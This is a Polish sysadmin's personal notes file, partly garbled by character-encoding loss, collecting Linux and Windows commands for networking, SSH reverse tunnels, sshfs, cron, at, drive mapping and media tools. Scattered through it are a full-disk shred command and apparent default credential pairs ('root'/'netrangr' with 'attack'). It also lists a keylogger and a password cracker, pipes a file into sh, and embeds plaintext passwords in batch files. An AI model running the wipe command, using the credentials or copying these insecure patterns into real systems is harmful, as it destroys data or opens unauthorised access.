mondo - archiwizacja http://mondorescue.linjection.org


---
amule
bittorrent
xmms xmms-mp3 xmms-faad2 gstreamer-plugins-ugly libmad libid3tag
vpnc
netbeans
pan
gnochm  -> CHM Viewer
fwlogwatch - Firewall log analyzer, report generator and realtime response agent  

iftop  Display bandwidth usage on an interface  

nagios - Open Source host, service and network monitoring program  
lshw - Hardware lister  
testdisk -  Tools to check and undelete partition or recover deleted files  
uberkey - Keylogger  
denyhosts -  Scan ssh server logs and block hosts  

linscope -  Network scanner for network shares  
skype
ntfs
fuse
adobe acrobat
real player

kcheckgmail
nagios -   monitoring network program
nettop

---------

----------------

yum -y install wireshark wireshark-gnome - siec

oracle - duzo nalez sie napracowac, nie spelnilem wszystkich wymagan. Szybko zainstalowac w pracy celem utrwalenia prktyki.


netstat -tup
netstat -tulp

gnokii
gammu

yum install vsftpd

snort 
mysql
apache - httpd
php



----------------------------


Uruchamia komentdy z pliku dopisywane dynamicznie
>tail -f plik | sh & 

yum install aide - How do I check the software integrity

From camera to website: Building an open source
http://www.redhatmagazine.com/2008/04/24/from-camera-to-website-building-an-open-source-video-streamer/

yum install dvgrab
yum install pitivi gstreamer-plugins-good.


How do I resize multiple image files using command-line tools?

yum install ImageMagick

After installing ImageMagick package, use mogrify to resize multiple image files. See example command below in resizing all JPG photos in the current working directory to 640 pixels in width while maintaining its original aspect ratio:

mogrify -resize 640 *.jpg

To resize the resolution of all JPG image files to exactly 640 pixels in width and 480 pixels in height, use:

mogrify -resize 640x480! *.jpg

Tips and tricks: How can I configure squid so that it never caches some web sites?
by the editorial team

Add the following line in /etc/squid/squid.conf:

acl NOCACHEDOMAIN dstdomain www.redhat.com
no_cache deny NOCACHEDOMAIN

It will not cache any content come from the domain www.redhat.com.

In /var/log/squid/access.log, it will show the page from that domain will always get "TCP_MISS" on consecutive visits.

Tips and tricks: How do I enable xdmcp in Red Hat Enterprise Linux 5?
by the editorial team

In Red Hat® Enterprise Linux® 4 and below the file /etc/X11/gdm/gdm.conf could be modified to enable xdmcp. With Red Hat Enterprise Linux 5, the location to enable xdmcp has changed.

There are two ways that xdmcp can be enabled:

* Modify the file /etc/gdm/custom.conf and under the [xdmcp] section, add this line:

      Enable=true

    * Alternately, the tool gdmsetup can be used. This is a gui-based tool to modify gdm. 

Once one of these two steps are done - simply run gdm-restart and then
login as desired user.


kasowanie dysku
shred -v -n 7 -z /dev/[sh]da 

backup MBR
dd if=/dev/sda of=/plik/z/backupem/mbr bs=512 count=1

sprawdzenie MX'a
host -t MX rafalkobe.pl

zapisywanie sesji
screen -L

iftop
iptraf
netwatch



masz tutaj skrypcik który robi screena (skaluje do 640x480) i wysy³a go na maila:

http://deimos.org.pl/sendwa.zip

musisz
1:mieæ zainstalowanego python-a oraz programik "import" (powinien byæ od razu)
2:wyedytowaæ ten skrypt i wpisaæ do niego twoje ustawienia (adres email, serwer poczty, konto, has³o)
3.utworzyæ katalog /root/report, /root/report/images
4.napisaæ skrypt (albo rozwin¹æ ten) który najpierw utworzy plik /root/report/index.txt ze wszystkimi monitorowanymi parametrami jakie chcesz (zostawiam to twojej inwencji), jesli nie chcesz tego robic to stwórz przynajmniej ten plik pusty albo z jakim tekstem inaczej mail siê nie wyle
5:jak chcesz ¿eby odapala³ siê cyklicznie - musisz go wrzuciæ do cron-a 


blokowanie hostów po nieudanym logowaniu
fail2ban, sshguard, denyhosts
 
 ClusterSSH: kontroluj wiele po³¹czeñ SSH
 
Ustawiæ zegar na UCT: w zimie jest to czas Polski - 1 godzina, w lecie czas Polski - 2 godziny. Czas letni zaczyna siê w nocy z ostatniej soboty na niedzielê w marcu, a czas zimowy zaczyna siê w nocy z ostatniej soboty na niedzielê w padzierniku.

- ksiegarnia i ksi¹¿ki

Onyszkiewicz
dzambel


root
attack

netrangr
attack


kopiowanie pliki/foldery ze zdalnego komputera do komputera lokalnego (scp)

scp -r nazwa_u¿ytkownika@192.168.0.1:/home/username/zdalnyplik.txt

skopiowaæ pliki z lokalnego komputera na zdaln¹ maszynê (scp)

scp -r pliklokalny.txt nazwau¿ytkownika@192.168.0.1:/home/username/






tcpdump -ennqti eth0 \( arp or icmp \)

tcpdump -c 3 -nni eth2 arp

iptraf - badanie obci¹zenia l¹cza


7.16.1. Tunel zwrotny SSH

MASZYNA 1 za NAT
ssh rtl@193.19.73.202 -R 6666:localhost:3389

MASZYNA 2 - 193.19.73.202
tsclient -p 6666

--

MASZYNA 3
ssh -L 7777:localhost:6666 rtl@193.19.73.202

z Windows
tsclient localhost:7777



Czêsto jest potrzeba do dostania siê maszyny "schowanej" za bramk¹ internetow¹. W przypadku rozwi¹zañ typu NAT lub Masquarading, bezporednie po³¹czenie siê ze schowanym komputerem z zewn¹trz nie jest mo¿liwe. Mo¿liwa jest natomiast inicjalizacja po³¹czenia ssh z docelowego komputera i zalogowanie siê na niego przez tak zwany tunel zwrotny.

Tunel ten tworzymy wywo³uj¹c na docelowym komputerze nastêpuj¹ce polecenie:

ssh user@server -R 7777:localhost:22

Podany numer portu - 7777 - jest przyk³adowy. Mo¿e byæ to dowolny numer portu nieu¿ywany na komputerze server. Takie polecenie spowoduje utworzenie tunelu zwrotnego - na docelowy komputer mo¿na siê zalogowaæ z komputera server przez wydanie polecenia:

ssh localhost -p 7777

Je¿eli tunel ma byæ aktywny przez d³u¿szy czas, warto uruchamiaj¹c tunel podaæ dodatkowe polecenie, którego aktywnoæ zabezpieczy przez zerwaniem po³¹czenia uznanego za nieu¿ywane. Przyk³adowo:

ssh user@server -R 7777:localhost:22 "/bin/sh -c 'while true; do sleep 5; \
echo +; done'"

Jeszcze lepszym rozwi¹zaniem jest u¿ycie programu autossh (w Debianie paczka o takiej samej nazwie). Program ten pozwala na uruchomienie tunelu z wykorzystaniem dodatkowego portu monitoruj¹cego - zerwane lub zablokowane po³¹czenia s¹ automatycznie wznawiane. Przyk³adowe wywo³anie autossh mog³oby wygl¹daæ nastêpuj¹co:

autossh -fN -M 7778 -R 7777:localhost:22 user@server

Opcja -f powoduje przejcie autossh w t³o, opcja -N jest przekazywana do ssh - zakazuje wykonywania komend - tylko przekierowywanie portów (zwiêksza to bezpieczeñstwo). Numer portu do monitorowania, tu przyk³adowo 7778, mo¿e byæ równie¿ dowolny, ale unikalny.

Oczywicie pozostaje problem, jak na docelowym komputerze, który jest niedostêpny, uruchomiæ tunel. Mo¿emy podyktowaæ odpowiednie polecenie przez telefon, ale na d³u¿sz¹ metê warto dodaæ albo odpowiednie wywo³anie ssh np. do crontaba, albo uruchomienie autossh przez skrypty startowe systemu. 


-------------------


 route add default gw 10.64.64.64
 route del default gw 192.168.1.1

---

iotop

----------

suse - suiuzi

-----------


smbclient //10.1.3.114/upload -Uuser

net rpc testjoin

Sam o sobie
Technicznie  gaber on luty 17, 2007 at 7:00

    * kim jestem?
      Cz³owiekiem ¿yj¹cym w du¿ym miecie, bardziej jako obserwator anie¿eli jego czêæ. Spora partia mojej egzystencji rozgrywa sie w sieci. Cz³owiekiem, któremu ¿ycie na dzieñ dobry da³o mocno w twarz, nie oszczêdzaj¹c na ka¿dym kroku. To co mam zawdziêczam tylko i wy³¹cznie sobie. Swojej pracy na to. Maj¹c solidne podstawy samodzielnoci, g³êboko zakorzenione w psychice, brnê przez ¿ycie.

    * co lubiê robiæ (zainteresowania)?
      Lubiê dobre kino - które trzeba szukaæ, odkrywaæ, a nastêpnie smakowaæ, co jaki czas do niego wracaæ, aby zasmakowaæ na nowo, przez pryzmat nowych dowiadczeñ w ¿yciu. Poza tym interesuje siê szeroko pojêtymi komputerami, z naciskiem na poznawanie. St¹d ¿ycie kreci siê wokól Uniksów i podobnych. Nale¿ê do braci linuksowej, ale tak¿e romansuje z Makami, ale nie tylko. Ponadto nie odstêpuje mnie ani na chwile w ¿yciu muzyka. Nie jestem w stanie okreliæ siê muzycznie.

    * czym siê zajmujê?
      Pracuje jako Release/Deploy Manager w warszawskiej Firmie eo Networks.
      Ponadto staram siê, aby gentoo.pl funkcjonowa³o poprawnie wraz wszystkim us³ugami, które obecnie hostuje. W wolnych chwilach staram sie czytaæ, niekoniecznie o IT. Ciê¿ko mi okreliæ siê w tej kwestii momentami. Sporo tego jest.

0 Comments 

-----------------------

loco
scite
audacious
gip
stremtuner
Dodatkowe repozytoria potrzebne są również do instalacji niektórych aplikacji, których nie ma w domyślnych repozytoriach. Przejdź więc do zakładki “Third party” i dodaj tam poniższą linię.
Da to możliwość pobierania większej liczby różnego rodzaju kodeków multimedialnych, Adobe Readera, Skypa:

deb http://packages.medibuntu.org/ gutsy free non-free

Kiedy już to zrobisz, otwórz terminal (Aplikacje -> Akcesoria -> Terminal) i wpisz następujące polecenie, aby zaimportować klucz GPG:

wget -q http://packages.medibuntu.org/medibuntu-key.gpg -O- | sudo apt-key add -

Po wykonaniu powyższych czynności, system powinien być przygotowany do instalacji dodatkowych aplikacji. Naciśnij w Synapticu przycisk Odśwież albo wpisz w konsoli:

sudo apt-get update

Rozpocznie się pobieranie danych z repozytoriów.

dpkg -l | grep linux-headers-* - lista zainstalowanych kernels

apt-get install nvidia-glx nvidia-kernel-common
------------------------------

Tworzenie i montowanie obrazów iso

Aby stworzyć obraz płyty w formacie ISO9660 wpisujemy w konsoli

dd if=/dev/cdrom of=/ścieżka/do/obrazu/image.iso 

Aby zamontować obraz iso należy wpisać w konsoli

mount -o loop -t iso9660 /ścieżka/do/obrazu/image.iso /ścieżka/docelowa/montowanego_obrazu 

------------------------------
rcconf
ipcalc 192.168.1.7/24
cheese
lshw
sshmenu
terminator
wireshark - analiza ruchu
tor - anonimizacja
vnstat -u -i ppp0 - monitoring interface
bum - menadżer usług startowych
tilda - przezroczysty terminal na pulpicie
gnubiff - powiadomienia o mailach
apt-get install john 

    *
- ip na pasku
apt-get install giplet

Co w sieci piszczy - lista IP i MAC
	sudo netdiscover -i eth0 -r 10.1.1.0/24


ograniczanie łącza dla wybranej aplikacji
trickle -d 30 wget http://jakas.strona.pl/plik.bz2


smbclient \\\\10.1.3.114\\C$ -U domenanet\\user

hping3 -S -p 80 interia.pl - pingowanie tego co się pingować nie da

update-rc.d - Zarządzanie usługami w stylu System-V

sudo update-rc.d -f apache2 remove

 Removing any system startup links for /etc/init.d/apache2 ...
   /etc/rc0.d/K20apache2
   /etc/rc1.d/K20apache2
   /etc/rc2.d/K20apache2
   /etc/rc3.d/K20apache2
   /etc/rc4.d/K20apache2
   /etc/rc5.d/K20apache2
   /etc/rcS.d/K20apache2

sudo update-rc.d apache2 start 20 2 3 4 5 . stop 20 0 1 6 .

 Adding system startup for /etc/init.d/apache2 ...
   /etc/rc0.d/K20apache2 -> ../init.d/apache2
   /etc/rc1.d/K20apache2 -> ../init.d/apache2
   /etc/rc6.d/K20apache2 -> ../init.d/apache2
   /etc/rc2.d/S20apache2 -> ../init.d/apache2
   /etc/rc3.d/S20apache2 -> ../init.d/apache2
   /etc/rc4.d/S20apache2 -> ../init.d/apache2
   /etc/rc5.d/S20apache2 -> ../init.d/apache2

 

Co spowoduje, że w poziomach pracy systemu 2,3,4 i 5 usługa apache2 będzie uruchomiona, a poziomach 0,1 i 6 nie.

 

UWAGA! Pamiętaj o kropkach - są ważne!

 

Jako alternatywy do update-rc.d możesz użyć programu sysv-rc-conf. Wybierz sam.

sudo update-rc.d  -f apache2 stop 20 0 1 2 3 4 5 6 .

 Adding system startup for /etc/init.d/apache2 ...
   /etc/rc0.d/K20apache2 -> ../init.d/apache2
   /etc/rc1.d/K20apache2 -> ../init.d/apache2
   /etc/rc2.d/K20apache2 -> ../init.d/apache2
   /etc/rc3.d/K20apache2 -> ../init.d/apache2
   /etc/rc4.d/K20apache2 -> ../init.d/apache2
   /etc/rc5.d/K20apache2 -> ../init.d/apache2
   /etc/rc6.d/K20apache2 -> ../init.d/apache2


Wykorzystanie NET USE
Zobacz także:

    * Mapowanie dysków
    * NET USE

Podłączanie dysku

@net use k: /delete /y
@net use k: \\IP_SERWERA\tomek /user:tomek haselko /y

 
Mapowanie drukarki

net use lpt1 /DELETE
net use lpt1 \\komputer_w_sieci\hp /persistent:yes

 
Podłączenie ukrytego zasobu

net use \\serwerek\IPC$ /USER:workgroup\admin

teraz podajemy tylko hasło i już mamy podłączony zasób


-------------
Rozpakowanie archiwów ".tar.gz":

tar xvzf paczka.tar.gz

Tworzenie archiwów ".tar.gz":

tar cvfz paczka.tar.gz katalog

Rozpakowanie archiwów ".tar.bz"

tar xvjf paczka.tar.bz

Tworzenie archiwów ".tar.bz":

tar cvjf paczka.tar.bz katalog

Rozpakowanie archiwów ".bz"

bunzip2 plik.bz

Rozpakowanie archiwów ".gz"

gunzip plik.gz

-----------------
SCP - Bezpieczne kopiowanie

Integralną częścią pakietu SSH jest program SCP (secure copy), służący do bezpiecznego kopiowania plików na zdalny komputer z działającym serwerem SSH oraz ze zdalnego komputera na komputer lokalny. Duet SSH+SCP jest doskonałym zamiennikiem serwera FTP, który jak wiadomo nie grzeszy bezpieczeństwem. W najprostszej postaci, skopiowanie pliku z użyciem SCP sprowadza się do wydania komendy:

scp plik.txt użytkownik@serwer:~/

- polecenie to skopiuje lokalny plik plik.txt na zdalny serwer o nazwie serwer do katalogu domowego użytkownika użytkownik. Zamiast ~/ możemy podać oczywiście dowolną, inną ścieżkę na zdalnym serwerze, do której mamy dostęp w trybie zapisu, np. /tmp czy /home/public, etc.

Aby skopiować plik ze zdalnego serwera na lokalny komputer również użyjemy programu scp:

scp użytkownik@serwer:~/plik.txt .

- skopiuje plik plik.txt znajdujący się w katalogu domowym użytkownika użytkownik na komputerze serwer do lokalnego katalogu, w którym aktualnie się znajdujemy.

Inne przydatne opcje SCP:
-r - kopiuje rekursywnie (z podkatalogami) podany katalog,
-P port - używa innego portu niż standardowy 22 (oczywiście używamy tej opcji w przypadku, gdy zdalny serwer SSH nasłuchuje na niestandardowym porcie).

Jeśli nie lubimy trybu konsoli i bardziej odpowiada nam praca w GUI lub trybie pseudo graficznym, możemy skorzystać z graficznego klienta SCP. Funkcję logowania przez SSH zawiera m.in. program Midnight Commander (opcja połączenie przez powłokę). W środowisku Windows możemy skorzystać z programu WinSCP, interfejsem przypominający Total Commandera (do którego zresztą również istnieje wtyczka wspierająca SCP).
X11 forwarding - uruchamiamy zdalnie aplikacje graficzne

Do nieznanych często funkcji SSH należy przekazywanie w sieci sesji protokołu X, dzięki czemu uruchomić możemy praktycznie każdy program graficzny na zdalnym komputerze. Wystarczy połączyć się ze zdalnym komputerem z opcją -X:

ssh -X user@serwer

a każde polecenie wymagające sesji X będzie korzystać z tej znajdującej się na lokalnym komputerze, z którego uruchomiliśmy połączenie. Możemy na stałe włączyć opcję X11 Forwarding, edytując plik /etc/ssh/ssh_config (opcja ForwardX11 yes). Aby opcja ta zadziałała, przekazywanie X11 musi być włączone również po stronie serwera (plik /etc/ssh/sshd_config). Domyślna wartość różni się w zależności od dystrybucji Linuksa.

Oczywiście, możemy również uruchomić program za pomocą jednego polecenia, podając je pomiędzy dwoma apostrofami, np:

ssh -X user@serwer 'firefox'

Możliwe że opcja -Y będzie bardziej użyteczna. "man ssh"

W zależności od lokalnej konfiguracji serwera X, może okazać się niezbędna autoryzacja zewnętrznych połączeń, przy pomocy komendy xhost. Przykładowo, polecenie xhost + zaakceptuje chwilowo wszelkie zewnętrzne aplikacje. Jeśli planujemy korzystać z tej opcji na stałe, zalecana jest naturalnie bardziej bezpieczna konfiguracja serwera X.

Oczywiście szybkość działania aplikacji graficznych odpalanych przez SSH bardzo zależy od przepustowości naszego oraz zdalnego połączenia internetowego. Przy łączu typu DSL bez problemu możemy uruchamiać nawet dość wymagające aplikacje, jak Skype czy Thunderbird.

 
SSHFS - Montujemy zdalny katalog

Praca na zdalnym serwerze za pomocą SSH może być nieco uciążliwa, zwłaszcza jeśli często musimy kopiować różne pliki w obu kierunkach. Wykorzystanie protokołu fish:// z Midnight Commandera czy Konquerora jest połowicznym rozwiązaniem - fish bywa zawodny, a także jest zdecydowanie wolniejszy niż dostęp przez czyste SSH. Idealnym rozwiązaniem byłaby możliwość montowania zdalnych zasobów dostępnych przez SSH. Od pewnego czasu możliwość taka istnieje dzięki kombinacji sshfs oraz fuse.

Fuse to moduł do jądra Linux (od niedawna znajduje się on już w podstawowej wersji jądra 2.6) pozwalający na montowanie systemów plików przez użytkownika nie posiadającego praw roota. Sshfs to program tworzony przez autora fuse, umożliwiający montowanie zdalnych zasobów poprzez SSH. Filozofia jest bardzo prosta - zasób SSH montowany jest w lokalnym katalogu. Od momentu zamontowania możemy wykonywać na nim prawie wszystkie operacje, dokładnie tak jakby był to katalog dostępny lokalnie.

Instalacja fuse i sshfs:

sudo apt-get install sshfs fuse

Następnie należy dodać swojego użytkownika do grupy fuse
np. komendą:

usermod -a -G fuse użytkownik

lub edytując plik /etc/group

UWAGA! : opcja usermod -G grupa,[...] (bez -a)
Lista dodatkowych grup, do których również należy użytkownik. Każda grupa oddzielona jest od następnej przecinkiem, bez wtrąconej spacji. Do grup odnoszą się te same ograniczenia, które obowiązują przy grupie podanej w opcji -g. Jeżeli użytkownik jest obecnie członkiem grupy, której nie podano na liście, to zostanie z niej usunięty. ZASTOSUJ ARGUMENT "-a" ! pozwoli to dodać użytkownika do grupy bez usuwania z istniejących grup.

 

Należy jeszcze załadować moduł fuse:

sudo modprobe fuse

Po przelogowaniu w konsoli możemy już spróbować zamontować zdalny katalog z użyciem sshfs:

mkdir ~/zdalny_serwer
sshfs użytkownik@zdalny_serwer:/tmp ~/zdalny_serwer

Powyższa komenda spowoduje zamontowanie katalogu /tmp na zdalnym serwerze w katalogu ~/zdalny_serwer. Skopiowanie jakiegoś pliku do tego katalogu spowoduje przezroczysty transfer tego pliku do katalogu domowego użytkownika na zdalnym serwerze. Podobny efekt będą miały inne operacje, jak tworzenie/usuwanie/edycja plików, nadawanie praw, etc.

Po zakończeniu pracy możemy odmontować katalog poleceniem:

fusermount -u ~/zdalny_serwer

Nic nie stoi na przeszkodzie, żeby dodać wpis o montowaniu przez sshfs do pliku /etc/fstab w celu automatycznego montowania podczas startu systemu.

sshfs#użytkownik@zdalny_serwer:/tmp    \
/home/użytkownik/zdalny_serwer/    fuse    defaults    0 0

Przedtem wypada również dodać do pliku /etc/modules wpis dotyczący modułu fuse. W innym wypadku katalog zdalny nie zamontuje się.

 
Tunel zwrotny SSH

Często jest potrzeba do dostania się maszyny "schowanej" za bramką internetową. W przypadku rozwiązań typu NAT lub Masquarading, bezpośrednie połączenie się ze schowanym komputerem z zewnątrz nie jest możliwe. Możliwa jest natomiast inicjalizacja połączenia ssh z docelowego komputera i zalogowanie się na niego przez tak zwany tunel zwrotny.

Tunel ten tworzymy wywołując na docelowym komputerze następujące polecenie:

ssh user@server -R 7777:localhost:22

Podany numer portu - 7777 - jest przykładowy. Może być to dowolny numer portu nieużywany na komputerze server. Takie polecenie spowoduje utworzenie tunelu zwrotnego - na docelowy komputer można się zalogować z komputera server przez wydanie polecenia:

ssh localhost -p 7777

Jeżeli tunel ma być aktywny przez dłuższy czas, warto uruchamiając tunel podać dodatkowe polecenie, którego aktywność zabezpieczy przez zerwaniem połączenia uznanego za nieużywane. Przykładowo:

ssh user@server -R 7777:localhost:22 "/bin/sh -c 'while true; do sleep 5; \
echo +; done'"

Jeszcze lepszym rozwiązeniem jest użycie programu autossh. Program ten pozwala na uruchomienie tunelu z wykorzystaniem dodatkowego portu monitorującego - zerwane lub zablokowane połączenia są automatycznie wznawiane. Przykładowe wywołanie autossh mogłoby wyglądać następująco:

Instalacja autossh:

sudo apt-get install autossh

Użycie:

autossh -fN -M 7778 -R 7777:localhost:22 user@server

Opcja -f powoduje przejście autossh w tło, opcja -N jest przekazywana do ssh - zakazuje wykonywania komend - tylko przekierowywanie portów (zwiększa to bezpieczeństwo). Numer portu do monitorowania, tu przykładowo 7778, może być również dowolny, ale unikalny.

Oczywiście pozostaje problem, jak na docelowym komputerze, który jest niedostępny, uruchomić tunel. Możemy podyktować odpowiednie polecenie przez telefon, ale na dłuższą metę warto dodać albo odpowiednie wywołanie ssh np. do crontaba, albo uruchomienie autossh przez skrypty startowe systemu.

----------------------------
Skrypt logowania domenowego logon.bat
Zobacz także:

    * Konfiguracja
    * Kontroler domeny
    * NET USE
    * Samba

**** plik musi nosić nazwę użytkownika domenowego

tomek.bat

echo Ustawiam czas systemowy
net time \\Serwerek /set /yes
echo Mapuje katalog domowy uzytkownika na serwerze Serwerek
net use z: /HOME
net use w: \\Serwerek\WOREK
net use y: \\Serwerek\DZIAL_Y
net use x: \\Serwerek\DZIAL_X
net use i: \\Serwerek\INSTALKI

 

dla użytkowników poza domeną można mapować dyski

tworząc im plik montuj.bat i dodając do autostartu

w pliku natomiat umieszczamy coś takiego:

@net use y: /delete /y
@net use y: \\10.1.1.1\tomek\dane  /user:tomek moje_haslo /y

pozwoli to na zamapowanie katalogu dane w domowym katalogu użytkownika tomek

jako dysku Y: z uprawnieniami takimi jakie posiada użytkownik tomek. ---- Ostrożnie.

------------------------
Masowa obróbka fotografii JPEG (ImageMagick)
Zobacz także:

    * EXIF
    * ImageMagick
    * JPEG
    * Konwersja
    * Polecenia powłoki
    * Problem
    * Użyteczne porady
    * Fotografia
    * Z życia codziennego

Jeśli zdarzyło się że zostałeś posiadaczem kilkunastu gigabajtów fotografii ze swojego super wypasionego aparatu cyfrowego i doszedłeś do wniosku, że niepotrzebnie kiedyś pstrykałeś w najlepszej jakości i najwyższych rozdzielczościach, to z pewnością z pomocą przyjdzie Ci pakiet ImageMagick.

Strona domowa projektu: http://www.imagemagick.org/script/index.php

Warto zwrócić uwagę na fakt, że jest to naprawdę potężne narzędzie. Na stronie http://www.imagemagick.org/script/examples.php można zobaczyć co ono potrafi.

Instalacja w Ubuntu (Instaluj teraz):

sudo apt-get install imagemagick

Wracając do naszego problemu maniakalnego pstrykania "rozmiarowych" fotek.

Oto przykład użycia ImageMagick'a do masowej obróbki zdjęć do jakości 75.

find katalog/ -type f -name "*[jJ][pP][gG]" -exec convert -quality 75 {} {}_nowy \;

lub

find katalog/ -type f -name "*[jJ][pP][gG]" -exec mogrify -quality 75 {} \;

Oba polecenia wykonają to samo aczkolwiek są między nimi pewne różnice, który w naszym rozwiązaniu nie mają żadnego znaczenia. Jakość 75 jest zadowalającą jakością do oglądania i zapewne do wydruku.
Jeśli natomiast zamierzasz w przyszłości obrabiać graficznie swoje fotki, to lepiej pozostaw gdzieś oryginały w dużych i dobrych rozdzielczościach.

Nie trzeba się o nic martwić jak tylko o podanie właściwego katalogu, a reszta już zostanie wykonana automagicznie wraz z podkatalogami :)

Inne sposoby użycia poleceń: "convert" i "mogrify", takie jak skalowanie i dodawanie obwódki, znajdziesz na stronie autorów projektu.

----------------

Cron - zarządzaj zaplanowanymi zadaniami

Przydatne linki: http://it-static.pl/index.php?q=odkladanie-zadan-at

 
Informacje ogólne

Pliki zezwalające lub blokujące dostęp dla danych użytkowników to: /etc/cron.allow oraz /etc/cron.deny. Aby zabronić użytkownikowi wykonywania zaplanowanych zadań wpisz jego login do odpowiedniego pliku. Jeśli plik nie istnieje to go utwórz. Potrzebny restart demona "cron"

 

Przykładowy główny plik konfiguracyjny daemona "cron" - /etc/crontab

MAILTO=root

SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
HOME=/

# run-parts - uruchamiaj wszystkie skrypty z katalogów: (co godzinę, raz dziennie, raz na tydzień, raz na miesiąc)
01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly

 

W katalogach /etc/cron.* umieszczone są skrypty z ważnymi systemowymi poleceniami, które są cyklicznie wywoływane -
właścicielem tych zadań jest root.

 
Zmienne:

MAILTO - zawiera e-mail użytkownika, do którego będą wysłane raporty błędów jeśli cron nie będzie mógł wykonać zaplanowanego zadania.

 

SHELL - powłoka z której ma korzystać cron,
PATH - ścieżki
HOME - katalog domowy

 
Opis pól

Pola czasowe (pięć pierwszych kolumn) ich reprezentacje oraz przyjmowane wartości:
numer pola 	reprezentacja 	przyjmowane wartości
1 	minuty 	0-59
2 	godziny 	0-23
3 	dni miesiąca 	1-31
4 	miesiące 	1-12 (również 3 literowe skróty angielskie)
5 	dni tygodnia 	0-7 ( 0 i 7 oznaczają niedzielę, można stosować 3 literowe skróty ang.)

 

Przykłady interpretacji pól czasowych
05 * * * * - "gdy ilość minut wynosi 5" - czyli co godzinę - hourly
01 2 * * * - "o godzinie 02:01" - raz dziennie - daily

21 2 * * 0 - "o godzinie 02:21 w niedzielę" - raz na tydzień - weekly
41 2 1 * * - "każdego pierwszego o 2:41" - raz na miesiąc - monthly

 
Dodawanie zadań

crontab -u login plik_crona

Opcje "crontab":
"-l" - wyświetlenie zadań,
"-r" - usunięcie całej tablicy "crona",
"-e" - edycja tablicy.

 

Przykład: przysyłaj mi raporty 12 i 22 każdego miesiąca o godzinie 10:00.

0 10 12,22 * * /root/polecenie | mail -s "raport polecenia" root < /root/raporty/polecenie.log

Warto pamiętać również o:
- pole zawierające gwiazdkę oznacza, że ta wartość jest nieistotna w danej regule

- można wskazać katalog ze skryptami, które mają być uruchamiane:

0 0 1 * *     $HOME/bin/co_miesiac

- liczby można podawać na wiele sposobów - jako zakresy lub jako wyliczenia np.:
  pole minuty 1,11,21,31,41,51 - czyli co 10 minut
  pole godziny 10-20 - czyli od 10 do 20 godziny


----------------------------

Strona główna
A- | A+
Nagrywanie TV z tunera
Zobacz także:

    * Polecenia powłoki
    * Użyteczne porady

Przydatne informacje o Mplayerze

http://www.mplayerhq.hu/DOCS/HTML/pl/index.html

Nagrywanie :

mencoder -tv driver=v4l2:channel=1:input=0:norm=0:alsa:amode=1:forceaudio:fps=25 \
-oac mp3lame -lameopts  cbr:br=224:ratio=10:vol=10:q=4:mode=3 -vf pp=lb -ovc lavc \
-lavcopts vcodec=msmpeg4:vbitrate=1200 -ofps 25 -endpos 02:00:00 tv://1 -o tv.avi

-endpos 02:00:00 - oznacza 2h nagrywania

norm:
 0 = PAL; 1 = PAL-BG; 2 = PAL-I; 3 = PAL-DK; 4 = NTSC; 5 = SECAM; 6 = PAL-M; 7 = PAL-Nc; 8 = PAL-6

Odtwarzanie używając mplayera (prosto z tunera):

mplayer tv:// -tv driver=v4l2:input=0:alsa


-----------------------------------------

Wyświetlenie listy plików .deb posortowanych rosnąco

ls -hsS -r /media/deb/*.deb

Szybka zamiana tekstu w pliku ("sed")

sed -e 's/szukany/zastepujacy/g' -i /sciezka/plik.txt

Niestandardowe wykorzystanie kalkulatorka "BC"

echo "56.8 + 77.7" | bc

echo "scale=6;  60/7.02" | bc

Wyświetlenie listy aktywnych programów korzystających z sieci

sudo lsof -n -i -a -u nazwa_usera

lub ogólnie:

sudo lsof -n -i -a

 
Wyświetlenie listy plików i ich rozmiarów posortowanych rosnąco

find "katalog/" -type f -name "*.mp3" -printf "%s %f\n" | sort -n -t' ' -k 1

Zmodyfikuj do swoich potrzeb.

 
Jak policzyć ilość plików w katalogach

 find katalog/ -maxdepth 10 -type f  | wc -l 

-maxdepth mówi o tym jak głęboko ma wchodzić w podkatalogi program find.

 
Jak policzyć ilość katalogów

 ls -l katalog/  | grep ^d| wc -l 

to samo ale rekurencyjnie

ls -lAR katalog/  | grep ^d| wc -l

 
-----------------------------

 Co możesz zrobić teraz ... zrób później (at)
Zobacz także:

    * Administracja
    * at
    * Konfiguracja
    * Serwer

Przydatne linki: http://it-static.pl/index.php?q=zarzadzaj-zaplanowanymi-zadaniami-cron

 

Polecenie "at" jak "cron" posiada pliki zezwolenia i blokady wykonywania zadań przez użytkowników: /etc/at.allow i /etc/at.deny.

 
Podstawowa składania polecenia to:

at czas/data polecenie

 

Przykład:
Utwórzmy plik "polecenia.cmd", w którym wpiszemy kilka poleceń ("na potem"):

dmesg > /home/user/zrzut_dmesg.txt
ps aux > /home/user/zrzut_procesow.txt

a następnie uruchomimy:

at 12:17 < polecenia.cmd
warning: commands will be executed using /bin/sh
job 2 at Tue Jun  5 12:17:00 2007

zostaliśmy poinformowani o kolejności wykonywania poleceń oraz o numerze zadania

 
inne możliwości

- dzień i godzina wykonania polecenia:

at 10:21 07.06.22 < polecenia.cmd
warning: commands will be executed using /bin/sh
job 3 at 2007-06-22 10:21

 

- znak "+" jako informacja, że czas(data) wykonania to suma dwóch czasów(dat). Np. za dwa dni o piątej

at 5pm + 2 days < polecenia.cmd
warning: commands will be executed using /bin/sh
job 5 at 2007-06-24 17:00

 

- "mieszane czasy i daty"

at 11am Jul 21 07
warning: commands will be executed using /bin/sh
at> /root/skrypcik.sh && cp /root/wynik.log /root/logi
at> <EOT>
job 5 at 2007-07-21 11:00

 

Zwróć uwagę, że nie podaliśmy jako argumentu pliku z poleceniami, ale w następnych liniach rozpoczynających się
od znaku zachęty "at>" podajemy polecenia do wykonania.

 

- "pisane czasy i daty" np. jutro o pierwszej w nocy:

at 1am tomorrow < polecenia_na_jutro

 

- za trzy dni w porze herbatki

at teatime + 3 days < jutro_przy_herbacie

 
Zarządzanie zaplanowanymi zadaniami

Sprawdźmy kto i na kiedy zaplanował uruchomienia - służy do tego polecenie "atq":

atq

4       2007-06-24 17:00 a root
5       2004-07-21 11:00 a root
6       2004-03-07 16:00 a root

 

Anulowanie zadań wykonujemy poleceniem "atrm", jako argument(y) podajemy numer(y) zadania(ń) do usunięcia:

atrm 5 6 7

 
--------------------------------
Sprawdzenie częstotliwości użycia poleceń

history | awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] " " CMD[a]/count*100 "% " a;}' | grep -v "./" | column -c3 -s " " -t | sort -nr | nl |  head -n10

 
---------------------------


Pobranie całego serwisu www na dysk
